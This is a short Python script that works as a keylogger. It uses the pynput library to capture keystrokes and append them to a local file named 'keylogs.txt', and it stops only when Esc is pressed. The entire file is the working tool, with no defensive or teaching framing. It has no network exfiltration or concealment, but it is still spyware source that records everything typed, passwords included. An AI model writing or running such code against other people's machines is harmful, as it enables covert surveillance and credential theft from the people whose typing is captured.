import os
from pynput import keyboard

def on_press(key):
    try:
        if key == keyboard.Key.esc:
            return False
        
        with open('keylogs.txt', 'a') as f:
            if hasattr(key, 'char'):
                f.write(key.char)
            else:
                special_keys = {
                    keyboard.Key.space: '[SPACE]',
                    keyboard.Key.enter: '[ENTER]\n'
                }
                if key in special_keys:
                    f.write(special_keys[key])
            f.flush()
    except Exception as e:
        print(f"Error: {e}")

def main():
    if not os.path.exists('keylogs.txt'):
        with open('keylogs.txt', 'w') as f:
            pass
    
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()